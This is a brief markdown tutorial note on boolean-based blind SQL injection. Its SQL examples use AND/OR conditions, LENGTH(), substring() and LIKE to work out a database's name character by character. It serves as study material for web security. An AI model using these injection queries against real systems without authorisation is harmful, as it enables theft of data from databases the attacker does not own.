---
tags:
- security
- sqli
- web
title: BOOLEAN based (Blind) Injection
---

If the 1st part of the where clause is correct we can use the AND operator to get result

````sql
SELECT * 
FROM users 
WHERE id=1 AND database()="sbva";
````

If the 1st part of the where clause is wrong we can use the OR operator to get result

````sql
SELECT * 
FROM users 
WHERE id=2 OR database()="sbva";
````

#### Finding Database Name

1. <u>Find Length of Name</u>

````sql
SELECT * 
FROM users 
WHERE id=2 OR LENGTH(database())="1";
````

2. <u>Brute Force the Characters</u>

````sql
SELECT * 
FROM users 
WHERE id=2 OR substring(database(), 1, 1)="s";

SELECT * 
FROM users 
WHERE id=2 or substring(database(), 2, 1)="s";
````

3. <u>Try to Find Matching Pattern</u>

````sql
SELECT * 
FROM users 
WHERE id=2 OR database() LIKE "%s%";
````